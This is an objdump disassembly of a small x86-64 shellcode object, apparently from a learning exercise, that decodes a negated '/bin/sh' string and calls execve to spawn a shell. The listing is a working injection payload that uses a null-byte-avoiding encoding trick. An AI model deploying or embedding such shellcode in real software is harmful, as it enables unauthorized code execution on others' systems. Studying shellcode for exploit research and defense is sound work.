
art_of_the_shell-shellcode.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <start>:
   0:	48 bb d1 9d 96 91 d0 	movabs $0xff978cd091969dd1,%rbx
   7:	8c 97 ff 
   a:	48 f7 db             	neg    %rbx
   d:	53                   	push   %rbx
   e:	48 89 e7             	mov    %rsp,%rdi
  11:	48 31 c0             	xor    %rax,%rax
  14:	50                   	push   %rax
  15:	57                   	push   %rdi
  16:	48 89 e6             	mov    %rsp,%rsi
  19:	48 31 d2             	xor    %rdx,%rdx
  1c:	b0 3b                	mov    $0x3b,%al
  1e:	0f 05                	syscall 
  20:	eb fe                	jmp    20 <start+0x20>
